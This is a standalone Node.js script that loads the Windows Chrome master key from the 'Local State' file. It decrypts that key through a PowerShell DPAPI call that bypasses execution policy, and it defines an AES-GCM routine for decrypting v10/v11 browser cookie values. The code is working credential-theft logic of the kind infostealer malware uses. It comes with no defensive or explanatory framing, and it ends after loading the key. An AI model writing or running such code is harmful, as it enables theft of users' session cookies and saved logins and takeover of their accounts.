const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3'); // Or raw sqlite reader

function getMasterKey(userDataDir) {
  const localStatePath = path.join(userDataDir, 'Local State');
  if (!fs.existsSync(localStatePath)) return null;

  const content = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
  const encKeyB64 = content?.os_crypt?.encrypted_key;
  if (!encKeyB64) return null;

  const rawBytes = Buffer.from(encKeyB64, 'base64').subarray(5);
  const hexCipher = rawBytes.toString('hex');

  const psScript = `
Add-Type -AssemblyName System.Security
$bytes = [byte[]]("${hexCipher}" -split '(..?)' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
$plain = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[Convert]::ToBase64String($plain)
  `;

  try {
    const b64Key = execSync(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${psScript.replace(/\n/g, ' ')}"`, {
      encoding: 'utf8',
    }).trim();
    return Buffer.from(b64Key, 'base64');
  } catch (err) {
    console.error('Failed DPAPI unprotect:', err.message);
    return null;
  }
}

function decryptCookie(masterKey, encryptedVal) {
  if (!encryptedVal || encryptedVal.length < 31) return null;
  const prefix = encryptedVal.subarray(0, 3).toString('utf8');
  if (prefix !== 'v10' && prefix !== 'v11') return null;

  const iv = encryptedVal.subarray(3, 15);
  const authTag = encryptedVal.subarray(encryptedVal.length - 16);
  const ciphertext = encryptedVal.subarray(15, encryptedVal.length - 16);

  try {
    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
    decipher.setAuthTag(authTag);
    return decipher.update(ciphertext, undefined, 'utf8') + decipher.final('utf8');
  } catch (e) {
    return null;
  }
}

const chromeUserData = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data');
const masterKey = getMasterKey(chromeUserData);
console.log('Chrome Master Key loaded:', masterKey ? `${masterKey.length} bytes` : 'FAILED');
